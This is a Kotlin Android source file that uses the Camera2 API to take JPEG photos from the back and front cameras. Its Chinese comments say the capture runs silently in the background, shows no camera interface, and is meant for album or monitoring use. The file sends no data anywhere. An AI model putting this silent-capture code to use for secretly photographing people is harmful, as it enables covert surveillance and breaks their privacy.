package com.screenshare

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.util.Size
import java.io.ByteArrayOutputStream
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * Camera2 无预览拍照：依次用后置（LENS_FACING_BACK）与前置（FRONT）摄像头各拍一张 JPEG。
 * 拍摄过程不显示任何相机界面（后台静默，配合相册/监控场景）。
 * 需要 CAMERA 权限；结果回调返回 [后置JPEG, 前置JPEG]，某镜头不可用则对应元素为 null。
 */
object CameraCapture {
    private const val TAG = "CameraCapture"

    /** 拍照结果：[后置JPEG, 前置JPEG]，失败元素为 null；error 记录失败详情（全部失败时非空） */
    class Result(val backJpeg: ByteArray?, val frontJpeg: ByteArray?, val error: String? = null)

    /** frontOnly=true 时只拍前置镜头 */
    fun capture(context: Context, timeoutMs: Long = 15000, frontOnly: Boolean = false): Result {
        val errs = mutableListOf<String>()
        val back = if (frontOnly) null else captureLens(context, CameraCharacteristics.LENS_FACING_BACK, timeoutMs) { errs += it }
        val front = captureLens(context, CameraCharacteristics.LENS_FACING_FRONT, timeoutMs) { errs += it }
        if (back == null && front == null) {
            return Result(null, null, errs.joinToString("；").ifEmpty { "未知错误" })
        }
        return Result(back, front, null)
    }

    private fun captureLens(context: Context, lensFacing: Int, timeoutMs: Long, onFail: (String) -> Unit): ByteArray? {
        val label = if (lensFacing == CameraCharacteristics.LENS_FACING_BACK) "后置" else "前置"
        val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val cameraId = manager.cameraIdList.firstOrNull { id ->
            val ch = manager.getCameraCharacteristics(id)
            ch.get(CameraCharacteristics.LENS_FACING) == lensFacing
        } ?: run {
            onFail("${label}镜头不存在")
            return null
        }

        val characteristics = manager.getCameraCharacteristics(cameraId)
        // 选择最大 JPEG 输出尺寸（照片质量优先）
        val jpegSizes = characteristics
            .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            ?.getOutputSizes(ImageFormat.JPEG)
        if (jpegSizes == null || jpegSizes.isEmpty()) {
            onFail("${label}镜头无 JPEG 输出")
            return null
        }
        val size = jpegSizes.maxByOrNull { it.width.toLong() * it.height } ?: Size(1920, 1080)

        // 屏幕旋转角 → JPEG 方向（后置 90° 基准，前置镜像）
        val displayRotation = context.display?.rotation ?: 0
        val jpegOrientation = sensorToJpegOrientation(characteristics, displayRotation)

        val handlerThread = HandlerThread("camera-capture").apply { start() }
        val handler = Handler(handlerThread.looper)
        var device: CameraDevice? = null
        var session: CameraCaptureSession? = null
        var reader: ImageReader? = null
        val latch = CountDownLatch(1)
        var result: ByteArray? = null

        try {
            reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
            reader.setOnImageAvailableListener({ r ->
                r.acquireLatestImage()?.use { image ->
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    result = bytes
                }
                latch.countDown()
            }, handler)

            val openLatch = CountDownLatch(1)
            var openError: Throwable? = null
            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    device = camera
                    openLatch.countDown()
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    openLatch.countDown()
                    latch.countDown()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    openError = RuntimeException("camera open error $error")
                    openLatch.countDown()
                    latch.countDown()
                }
            }, handler)
            if (!openLatch.await(timeoutMs, TimeUnit.MILLISECONDS)) {
                Log.w(TAG, "打开镜头 $cameraId 超时")
                onFail("${label}打开超时")
                return null
            }
            if (openError != null) {
                onFail("${label}打开失败: ${openError!!.message}")
                throw openError!!
            }
            val d = device ?: run { onFail("${label}设备为空"); return null }

            val captureRequest = d.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                addTarget(reader!!.surface)
                set(CaptureRequest.JPEG_ORIENTATION, jpegOrientation)
            }
            val captureLatch = CountDownLatch(1)
            var configureFailed = false
            d.createCaptureSession(listOf(reader!!.surface), object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(c: CameraCaptureSession) {
                    session = c
                    try {
                        c.capture(captureRequest.build(), object : CameraCaptureSession.CaptureCallback() {
                            override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: android.hardware.camera2.TotalCaptureResult) {
                                captureLatch.countDown()
                            }
                        }, handler)
                    } catch (t: Throwable) {
                        captureLatch.countDown()
                    }
                }

                override fun onConfigureFailed(c: CameraCaptureSession) {
                    configureFailed = true
                    captureLatch.countDown()
                }
            }, handler)
            if (!captureLatch.await(timeoutMs, TimeUnit.MILLISECONDS)) {
                Log.w(TAG, "镜头 $cameraId 拍摄超时")
                onFail("${label}拍摄超时")
                return null
            }
            if (configureFailed) {
                onFail("${label}配置失败")
                return null
            }
            if (!latch.await(timeoutMs, TimeUnit.MILLISECONDS)) {
                Log.w(TAG, "镜头 $cameraId 读取照片超时")
                onFail("${label}读取照片超时")
                return null
            }
            return result
        } catch (t: Throwable) {
            Log.e(TAG, "镜头 $lensFacing 拍照异常: ${t.message}")
            onFail("${label}异常: ${t.message}")
            return null
        } finally {
            try { session?.close() } catch (_: Throwable) {}
            try { device?.close() } catch (_: Throwable) {}
            try { reader?.close() } catch (_: Throwable) {}
            handlerThread.quitSafely()
        }
    }

    /** 按屏幕方向与镜头朝向计算 JPEG 旋转角，保证照片方向正确 */
    private fun sensorToJpegOrientation(ch: CameraCharacteristics, displayRotation: Int): Int {
        val sensorOrient = ch.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 90
        val facing = ch.get(CameraCharacteristics.LENS_FACING)
        val deviceRotation = when (displayRotation) {
            android.view.Surface.ROTATION_90 -> 90
            android.view.Surface.ROTATION_180 -> 180
            android.view.Surface.ROTATION_270 -> 270
            else -> 0
        }
        return if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
            (sensorOrient + deviceRotation) % 360
        } else {
            (sensorOrient - deviceRotation + 360) % 360
        }
    }
}
